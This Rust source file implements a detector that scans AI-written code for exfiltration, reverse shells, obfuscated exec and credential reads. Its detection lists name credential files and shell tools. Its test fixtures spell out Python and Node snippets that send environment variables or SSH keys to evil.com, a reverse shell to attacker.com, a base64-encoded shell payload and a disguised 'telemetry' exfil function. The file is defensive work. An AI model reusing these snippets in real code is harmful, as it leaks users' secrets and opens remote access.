use mc_core::operation::{DataFlowDirection, OperationPattern, OperationSignals};

/// Static analysis of code content being written to files.
///
/// Scans source code for patterns that indicate exfiltration, backdoors,
/// reverse shells, or other malicious behavior. This catches attacks where
/// an AI writes trojan code that looks legitimate but contains hidden payloads.
pub struct ContentAnalyzer;

/// Result of content analysis.
#[derive(Debug, Clone)]
pub struct ContentAnalysis {
    pub has_network_exfil: bool,
    pub has_reverse_shell: bool,
    pub has_obfuscated_exec: bool,
    pub has_credential_harvest: bool,
    pub has_env_exfil: bool,
    pub pattern: OperationPattern,
    pub data_flow: DataFlowDirection,
    pub findings: Vec<String>,
}

impl ContentAnalyzer {
    /// Analyze code content for malicious patterns.
    pub fn analyze(content: &str) -> ContentAnalysis {
        let lower = content.to_lowercase();
        let mut findings = Vec::new();

        let has_network_exfil = Self::detect_network_exfil(&lower, &mut findings);
        let has_reverse_shell = Self::detect_reverse_shell(&lower, &mut findings);
        let has_obfuscated_exec = Self::detect_obfuscated_exec(&lower, content, &mut findings);
        let has_credential_harvest = Self::detect_credential_harvest(&lower, &mut findings);
        let has_env_exfil = Self::detect_env_exfil(&lower, &mut findings);

        let pattern = if has_reverse_shell {
            OperationPattern::KnownMalicious
        } else if has_network_exfil || has_obfuscated_exec || has_env_exfil {
            OperationPattern::Suspicious
        } else if has_credential_harvest {
            OperationPattern::Suspicious
        } else {
            OperationPattern::Normal
        };

        let data_flow = if has_network_exfil || has_env_exfil || has_reverse_shell {
            DataFlowDirection::ExfiltrationSuspected
        } else if has_credential_harvest {
            DataFlowDirection::Outbound
        } else {
            DataFlowDirection::Internal
        };

        ContentAnalysis {
            has_network_exfil,
            has_reverse_shell,
            has_obfuscated_exec,
            has_credential_harvest,
            has_env_exfil,
            pattern,
            data_flow,
            findings,
        }
    }

    /// Merge content analysis results into existing operation signals.
    pub fn merge_into_signals(analysis: &ContentAnalysis, signals: &mut OperationSignals) {
        if analysis.has_network_exfil || analysis.has_env_exfil {
            signals.has_network_sink = true;
        }
        if analysis.has_credential_harvest || analysis.has_env_exfil {
            signals.reads_sensitive_source = true;
        }
        if analysis.has_obfuscated_exec {
            signals.uses_obfuscation = true;
            signals.executes_dynamic_code = true;
        }
        if analysis.has_reverse_shell {
            signals.has_network_sink = true;
            signals.modifies_security_controls = true;
        }
    }

    /// Detect code that sends data to external endpoints.
    ///
    /// Looks for combinations of: network library + sensitive data source.
    fn detect_network_exfil(lower: &str, findings: &mut Vec<String>) -> bool {
        let network_calls = [
            ("urllib.request", "urlopen"),
            ("urllib.request", "Request"),
            ("requests.post", ""),
            ("requests.get", ""),
            ("requests.put", ""),
            ("http.client", "HTTPConnection"),
            ("http.client", "HTTPSConnection"),
            ("httpx.post", ""),
            ("httpx.get", ""),
            ("aiohttp", "session"),
            ("fetch(", ""),
            ("XMLHttpRequest", ""),
            ("axios.post", ""),
            ("axios.get", ""),
            ("got(", ""),
            ("node-fetch", ""),
            ("http.request(", ""),
            ("https.request(", ""),
            ("net.connect(", ""),
            ("net::http", ""),
            ("open-uri", ""),
            ("lwp::useragent", ""),
            ("io::socket", ""),
            ("socket.connect", ""),
        ];

        let sensitive_data = [
            "os.environ",
            "process.env",
            "env.get(",
            "getenv(",
            "env::var",
            "env::",
            "ssh_key",
            "api_key",
            "secret",
            "password",
            "credential",
            "token",
            "private_key",
            ".ssh/",
            ".aws/",
            ".gnupg/",
            "/etc/passwd",
            "/etc/shadow",
        ];

        let has_network = network_calls.iter().any(|(lib, method)| {
            if method.is_empty() {
                lower.contains(lib)
            } else {
                lower.contains(lib) || lower.contains(method)
            }
        });

        let has_sensitive = sensitive_data.iter().any(|p| lower.contains(p));

        if has_network && has_sensitive {
            findings.push(
                "Code sends sensitive data (credentials/env vars) to a network endpoint".to_string(),
            );
            return true;
        }

        false
    }

    /// Detect reverse shell patterns in code.
    fn detect_reverse_shell(lower: &str, findings: &mut Vec<String>) -> bool {
        let patterns = [
            // Python reverse shells
            ("socket.socket", "os.dup2"),
            ("socket.socket", "subprocess.call"),
            ("socket.connect", "/bin/sh"),
            ("socket.connect", "/bin/bash"),
            // Bash reverse shells
            ("bash -i", "/dev/tcp"),
            ("/dev/tcp/", ""),
            // PHP reverse shells
            ("fsockopen", "proc_open"),
            ("fsockopen", "shell_exec"),
            // Ruby reverse shells
            ("tcpsocket.new", "exec"),
            ("tcpsocket.open", "exec"),
            // Perl reverse shells
            ("io::socket::inet", "exec"),
        ];

        for (p1, p2) in &patterns {
            if p2.is_empty() {
                if lower.contains(p1) {
                    findings.push(format!("Reverse shell pattern detected: {}", p1));
                    return true;
                }
            } else if lower.contains(p1) && lower.contains(p2) {
                findings.push(format!(
                    "Reverse shell pattern detected: {} + {}",
                    p1, p2
                ));
                return true;
            }
        }

        false
    }

    /// Detect obfuscated code execution (base64 decode + exec, eval of encoded strings).
    fn detect_obfuscated_exec(lower: &str, original: &str, findings: &mut Vec<String>) -> bool {
        // base64.b64decode + exec/eval
        if lower.contains("b64decode") && (lower.contains("exec(") || lower.contains("eval(")) {
            findings.push("Base64-encoded code execution detected".to_string());
            return true;
        }

        // atob + eval (JavaScript)
        if lower.contains("atob(") && lower.contains("eval(") {
            findings.push("Base64 atob + eval detected (JavaScript)".to_string());
            return true;
        }

        // Buffer.from + eval (Node.js)
        if lower.contains("buffer.from(") && lower.contains("eval(") {
            findings.push("Buffer decode + eval detected (Node.js)".to_string());
            return true;
        }

        // Long base64 strings (>100 chars of base64 alphabet) that get decoded
        if lower.contains("base64") || lower.contains("b64decode") || lower.contains("atob") {
            let has_long_b64 = Self::has_long_base64_string(original);
            if has_long_b64 {
                findings.push("Long base64-encoded payload detected".to_string());
                return true;
            }
        }

        // chr() chains — building strings character by character to evade detection
        let chr_count = lower.matches("chr(").count();
        if chr_count >= 10 {
            findings.push(format!(
                "Character-by-character string construction ({} chr() calls)",
                chr_count
            ));
            return true;
        }

        // String.fromCharCode chains
        let from_char_count = lower.matches("fromcharcode").count();
        if from_char_count >= 5 {
            findings.push("String.fromCharCode chain detected".to_string());
            return true;
        }

        false
    }

    /// Detect code that reads credentials or sensitive files.
    fn detect_credential_harvest(lower: &str, findings: &mut Vec<String>) -> bool {
        let read_patterns = [
            "open(", "read(", "readlines(", "read_to_string",
            "fs.readfile", "fs.readfilesync",
            "file.read", "file::read",
        ];

        let credential_paths = [
            ".ssh/id_rsa",
            ".ssh/id_ed25519",
            ".ssh/id_dsa",
            ".ssh/known_hosts",
            ".aws/credentials",
            ".aws/config",
            ".gnupg/",
            ".netrc",
            ".npmrc",
            ".pypirc",
            ".docker/config.json",
            "credentials.json",
            "service-account",
            "/etc/shadow",
        ];

        let has_read = read_patterns.iter().any(|p| lower.contains(p));
        let has_cred_path = credential_paths.iter().any(|p| lower.contains(p));

        if has_read && has_cred_path {
            findings
                .push("Code reads credential files (SSH keys, AWS credentials, etc.)".to_string());
            return true;
        }

        false
    }

    /// Detect patterns that collect and exfiltrate environment variables.
    fn detect_env_exfil(lower: &str, findings: &mut Vec<String>) -> bool {
        // Pattern: iterate over all env vars + send to network
        let env_collection = [
            "os.environ.items()",
            "os.environ.copy()",
            "dict(os.environ)",
            "{k: v for k, v in os.environ",
            "json.dumps(os.environ",
            "process.env",
            "env::vars()",
            "system.getenv",
        ];

        let network_send = [
            "urlopen", "urllib", "requests.", "httpx.", "fetch(",
            "axios.", "http.request", "https.request",
            "curl", "wget",
        ];

        let has_env_collect = env_collection.iter().any(|p| lower.contains(p));
        let has_network = network_send.iter().any(|p| lower.contains(p));

        if has_env_collect && has_network {
            findings.push(
                "Code collects all environment variables and sends them to a network endpoint"
                    .to_string(),
            );
            return true;
        }

        false
    }

    /// Check if content contains a long base64-encoded string (>100 chars).
    fn has_long_base64_string(content: &str) -> bool {
        let mut run = 0;
        for ch in content.chars() {
            if ch.is_ascii_alphanumeric() || ch == '+' || ch == '/' || ch == '=' {
                run += 1;
                if run > 100 {
                    return true;
                }
            } else {
                run = 0;
            }
        }
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_python_env_exfil() {
        let code = r#"
import os, json, urllib.request

payload = json.dumps({"env": dict(os.environ)})
req = urllib.request.Request("https://evil.com/collect", data=payload.encode())
urllib.request.urlopen(req)
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_env_exfil);
        assert!(analysis.has_network_exfil);
        assert_eq!(analysis.data_flow, DataFlowDirection::ExfiltrationSuspected);
    }

    #[test]
    fn detect_python_reverse_shell() {
        let code = r#"
import os, socket
s = socket.socket()
s.connect(("attacker.com", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.system("/bin/sh")
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_reverse_shell);
        assert_eq!(analysis.pattern, OperationPattern::KnownMalicious);
    }

    #[test]
    fn detect_base64_exec() {
        let code = r#"
import base64
exec(base64.b64decode("aW1wb3J0IG9z"))
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_obfuscated_exec);
    }

    #[test]
    fn detect_js_atob_eval() {
        let code = r#"
const payload = atob("YWxlcnQoMSk=");
eval(payload);
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_obfuscated_exec);
    }

    #[test]
    fn detect_credential_read() {
        let code = r#"
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    key_data = f.read()
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_credential_harvest);
    }

    #[test]
    fn detect_credential_read_with_network() {
        let code = r#"
import urllib.request
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    key_data = f.read()
urllib.request.urlopen("https://evil.com", data=key_data.encode())
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_credential_harvest);
        assert!(analysis.has_network_exfil);
    }

    #[test]
    fn benign_code_passes() {
        let code = r#"
def validate_email(email):
    if not email or "@" not in email:
        return False
    local, _, domain = email.partition("@")
    return bool(local) and "." in domain
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(!analysis.has_network_exfil);
        assert!(!analysis.has_reverse_shell);
        assert!(!analysis.has_obfuscated_exec);
        assert!(!analysis.has_credential_harvest);
        assert!(!analysis.has_env_exfil);
        assert_eq!(analysis.pattern, OperationPattern::Normal);
    }

    #[test]
    fn benign_logging_code_passes() {
        let code = r#"
import logging
logger = logging.getLogger(__name__)

def log_request(method, path):
    logger.info(f"Request: {method} {path}")
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert_eq!(analysis.pattern, OperationPattern::Normal);
    }

    #[test]
    fn detect_node_env_exfil() {
        let code = r#"
const https = require('https');
const data = JSON.stringify(process.env);
const req = https.request("https://evil.com", { method: 'POST' });
req.write(data);
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_env_exfil);
    }

    #[test]
    fn detect_chr_chain_obfuscation() {
        let code = r#"
cmd = chr(99)+chr(117)+chr(114)+chr(108)+chr(32)+chr(104)+chr(116)+chr(116)+chr(112)+chr(58)+chr(47)
os.system(cmd)
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_obfuscated_exec);
    }

    #[test]
    fn detect_trojan_telemetry_function() {
        let code = r#"
import os, json, urllib.request

TELEMETRY_ENDPOINT = "https://telemetry.example.com/collect"

def report_login_attempt(email, success, metadata=None):
    payload = {
        "event": "login_attempt",
        "email": email,
        "environment": {k: v for k, v in os.environ.items()},
    }
    req = urllib.request.Request(
        TELEMETRY_ENDPOINT,
        data=json.dumps(payload).encode("utf-8"),
    )
    urllib.request.urlopen(req, timeout=5)
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_env_exfil, "Should detect env var collection + network send");
        assert!(analysis.has_network_exfil, "Should detect sensitive data + network");
    }

    #[test]
    fn long_base64_payload() {
        let code = r#"
import base64
payload = "aW1wb3J0IG9zLHNvY2tldDtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCJhdHRhY2tlci5jb20iLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLnN5c3RlbSgiL2Jpbi9zaCIp"
exec(base64.b64decode(payload))
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_obfuscated_exec);
    }

    #[test]
    fn detect_node_buffer_eval() {
        let code = r#"
const code = Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString();
eval(code);
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(analysis.has_obfuscated_exec);
    }

    #[test]
    fn findings_contain_descriptions() {
        let code = r#"
import os, socket
s = socket.socket()
s.connect(("evil.com", 1234))
os.dup2(s.fileno(), 0)
"#;
        let analysis = ContentAnalyzer::analyze(code);
        assert!(!analysis.findings.is_empty());
        assert!(analysis.findings[0].contains("Reverse shell"));
    }
}
